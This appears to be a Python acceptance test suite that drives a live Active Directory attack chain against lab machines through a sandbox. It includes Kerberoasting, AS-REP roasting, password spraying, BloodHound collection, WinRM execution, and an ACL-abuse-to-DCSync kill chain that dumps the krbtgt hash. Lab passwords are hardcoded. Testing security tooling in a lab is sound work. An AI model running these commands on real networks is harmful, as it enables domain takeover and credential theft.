"""S18: Lab-exec lane acceptance tests.

Verifies the SANDBOX_LAB_EXEC lane end-to-end: portal5-attack:latest spawned,
lab targets reachable, AD attack tools producing expected output.

Skipped entirely when SANDBOX_LAB_EXEC != "true" or LAB_TARGET_DC unset so
the suite runs cleanly in normal CI without a live lab.

Attack paths covered:
  S18-01  Sandbox health + lab-exec posture
  S18-02  nmap DC — AD port fingerprint (53/88/389/445/3268)
  S18-03  Kerberoast — 3 TGS hashes captured (svc_mssql/svc_iis/svc_backup)
  S18-04  AS-REP roast — 2 hashes (arya.stark / ned.stark)
  S18-05  Password spray (nxc SMB) — valid accounts detected
  S18-06  BloodHound collection — graph JSON produced
  S18-07  WinRM exec (nxc) — code exec on lab-srv01
  S18-08  Full kill chain — crack → ACL abuse → DCSync
           (modifies AD — reset with baseline-ad snapshot after run)
"""

from __future__ import annotations

import os
import time

from tests.acceptance._common import (
    MCP,
    _get,
    _mcp,
    record,
)

# Credentials seeded by lab_setup.py
_DC = os.environ.get("LAB_TARGET_DC", "")
_SRV = os.environ.get("LAB_TARGET_SRV", "")
_DOMAIN = "portal.lab"
_ADMIN = "administrator"
_ADMIN_PASS = "LabAdmin1!"
_SVC_BACKUP_PASS = "Backup123!"   # cracked from Kerberoast
_LOCAL_ADMIN_PASS = "LabAdmin1!"


def _lab_enabled() -> bool:
    return os.environ.get("SANDBOX_LAB_EXEC", "").lower() == "true" and bool(_DC)


async def run() -> None:
    """S18: Lab-exec lane — live AD attack chain acceptance."""
    print("\n━━━ S18. LAB-EXEC LANE (AD ATTACK CHAIN) ━━━")
    sec = "S18"

    if not _lab_enabled():
        record(
            sec, "S18-00", "Lab-exec lane enabled",
            "WARN",
            "SANDBOX_LAB_EXEC not set or LAB_TARGET_DC empty — skipping S18",
        )
        return

    sandbox_port = MCP.get("sandbox", 8914)

    # ── S18-01: sandbox health + posture check ────────────────────────────────
    t0 = time.time()
    code, data = await _get(f"http://localhost:{sandbox_port}/health", timeout=5)
    lab_active = isinstance(data, dict) and data.get("lab_exec_active") is True
    record(
        sec, "S18-01", "Sandbox health + lab-exec posture",
        "PASS" if code == 200 and lab_active else "WARN",
        f"HTTP {code} | lab_exec_active={lab_active}",
        t0=t0,
    )

    # ── S18-02: nmap DC — verify AD port fingerprint ──────────────────────────
    await _mcp(
        sandbox_port, "execute_bash",
        {"code": f"nmap -p 53,88,135,389,445,464,3268 --open {_DC} 2>&1", "timeout": 60},
        section=sec, tid="S18-02", name=f"nmap DC ({_DC}) AD ports",
        ok_fn=lambda t: "88/tcp" in t and "389/tcp" in t and "445/tcp" in t,
        warn_if=["Operation not permitted", "network unreachable", "0 hosts up"],
        timeout=90,
    )

    # ── S18-03: Kerberoast — 3 TGS hashes ────────────────────────────────────
    await _mcp(
        sandbox_port, "execute_bash",
        {
            "code": (
                f"impacket-GetUserSPNs {_DOMAIN}/{_ADMIN}:{_ADMIN_PASS}"
                f" -dc-ip {_DC} -request 2>&1"
            ),
            "timeout": 60,
        },
        section=sec, tid="S18-03", name="Kerberoast — 3 SPN hashes",
        ok_fn=lambda t: t.count("$krb5tgs$") >= 3,
        warn_if=["[-] ", "KerberosError", "network unreachable"],
        timeout=90,
    )

    # ── S18-04: AS-REP roast — 2 hashes ──────────────────────────────────────
    # arya.stark + ned.stark have pre-auth disabled
    await _mcp(
        sandbox_port, "execute_bash",
        {
            "code": (
                "printf 'arya.stark\\nned.stark\\n' > /tmp/users.txt && "
                f"impacket-GetNPUsers {_DOMAIN}/ -usersfile /tmp/users.txt"
                f" -dc-ip {_DC} -no-pass 2>&1"
            ),
            "timeout": 60,
        },
        section=sec, tid="S18-04", name="AS-REP roast — arya.stark + ned.stark",
        ok_fn=lambda t: t.count("$krb5asrep$") >= 2,
        warn_if=["[-] ", "KerberosError", "network unreachable"],
        timeout=90,
    )

    # ── S18-05: Password spray (nxc SMB) ─────────────────────────────────────
    # Spray a short list against SMB — expect at least one valid hit
    await _mcp(
        sandbox_port, "execute_bash",
        {
            "code": (
                "printf 'jon.snow\\ndarenerys.t\\n' > /tmp/spray_u.txt && "
                "printf 'Ghost123!\\nDragons1!\\n' > /tmp/spray_p.txt && "
                f"nxc smb {_DC}"
                f" -u /tmp/spray_u.txt -p /tmp/spray_p.txt --continue-on-success 2>&1"
            ),
            "timeout": 90,
        },
        section=sec, tid="S18-05", name="Password spray (nxc SMB) — valid hit",
        ok_fn=lambda t: "[+]" in t or "STATUS_SUCCESS" in t,
        warn_if=["[-] ", "network unreachable", "STATUS_LOGON_FAILURE"],
        timeout=120,
    )

    # ── S18-06: BloodHound collection ─────────────────────────────────────────
    await _mcp(
        sandbox_port, "execute_bash",
        {
            "code": (
                f"bloodhound-ce-python -u {_ADMIN} -p '{_ADMIN_PASS}'"
                f" -d {_DOMAIN} -dc {_DC} -c All --zip -ns {_DC}"
                f" --output /tmp/bh 2>&1 | tail -20"
            ),
            "timeout": 120,
        },
        section=sec, tid="S18-06", name="BloodHound collection — graph data",
        ok_fn=lambda t: any(x in t for x in ["Done", "zip", ".json", "Compressing"]),
        warn_if=["error", "exception", "network unreachable"],
        timeout=150,
    )

    # ── S18-07: WinRM exec on lab-srv01 ──────────────────────────────────────
    if _SRV:
        await _mcp(
            sandbox_port, "execute_bash",
            {
                "code": (
                    f"nxc winrm {_SRV}"
                    f" -u localadmin -p '{_LOCAL_ADMIN_PASS}' -x 'whoami' 2>&1"
                ),
                "timeout": 60,
            },
            section=sec, tid="S18-07", name=f"WinRM exec on srv01 ({_SRV})",
            ok_fn=lambda t: "[+]" in t or "portal\\" in t.lower() or "nt authority" in t.lower(),
            warn_if=["[-] ", "network unreachable", "WINRM_NOT_AVAILABLE"],
            timeout=90,
        )
    else:
        record(sec, "S18-07", "WinRM exec on srv01", "WARN", "LAB_TARGET_SRV not set — skip")

    # ── S18-08: Full kill chain — crack → ACL abuse → DCSync ─────────────────
    # svc_backup (Backup123!) → ensure GenericAll on Domain Admins via dacledit
    # → add arya.stark to DA via ldap3 NTLM bind → DCSync for NTLM hashes.
    # NOTE: modifies live AD — reset with baseline-ad snapshot after this section.
    kill_chain = f"""
python3 - <<PYEOF
import subprocess, sys
from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL

DC = "{_DC}"
DOMAIN = "{_DOMAIN}"

# Step 1: ensure svc_backup has GenericAll on Domain Admins (dacledit idempotent write)
print("=== [1/3] Verify svc_backup creds + ensure GenericAll ACE ===")
r = subprocess.run([
    "nxc", "smb", DC, "-u", "svc_backup", "-p", "{_SVC_BACKUP_PASS}",
], capture_output=True, text=True, timeout=30)
print(r.stdout.strip() + r.stderr.strip())
subprocess.run([
    "impacket-dacledit", f"{_DOMAIN}/administrator:{_ADMIN_PASS}",
    "-dc-ip", DC, "-principal", "svc_backup",
    "-target", "Domain Admins", "-rights", "FullControl", "-action", "write",
], capture_output=True, timeout=30)  # idempotent — OK if ACE already exists

# Step 2: add arya.stark to Domain Admins as svc_backup
print("=== [2/3] ACL abuse → add arya.stark to Domain Admins ===")
srv = Server(DC, port=389, get_info=ALL)
conn = Connection(srv, user="PORTAL\\\\svc_backup", password="{_SVC_BACKUP_PASS}",
                  authentication=NTLM, auto_bind=True)
conn.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)",
            search_scope=SUBTREE, attributes=["distinguishedName"])
arya_dn = conn.entries[0].distinguishedName.value
conn.modify("CN=Domain Admins,CN=Users,DC=portal,DC=lab",
            {{"member": [(MODIFY_ADD, [arya_dn])]}})
print(f"modify: {{conn.result.get('description')}} (rc={{conn.result.get('result')}})")
if conn.result.get("result") != 0:
    sys.exit(1)

# Step 3: DCSync as arya.stark (now DA)
print("=== [3/3] DCSync as arya.stark → krbtgt hash ===")
r = subprocess.run([
    "impacket-secretsdump", f"{_DOMAIN}/arya.stark:Winter1!@{{DC}}",
    "-just-dc-ntlm",
], capture_output=True, text=True, timeout=90)
for line in (r.stdout + r.stderr).splitlines():
    if any(x in line.lower() for x in ["krbtgt", "administrator", "dumping", "using drsuapi"]):
        print(line)
if r.returncode != 0 and "krbtgt" not in r.stdout.lower():
    sys.exit(1)
PYEOF
"""
    await _mcp(
        sandbox_port, "execute_bash",
        {"code": kill_chain, "timeout": 180},
        section=sec, tid="S18-08",
        name="Full kill chain: crack → ACL abuse → DCSync (resets AD)",
        ok_fn=lambda t: "krbtgt" in t.lower(),
        warn_if=["network unreachable", "sys.exit(1)"],
        timeout=240,
    )

    print(
        "\n  ⚠  S18-08 modifies live AD. Run snapshot rollback before next test round:\n"
        "     proxmox_vm_rollback(vmid=110, snapname='baseline-ad')\n"
        "     proxmox_vm_rollback(vmid=111, snapname='baseline-ad')\n"
    )
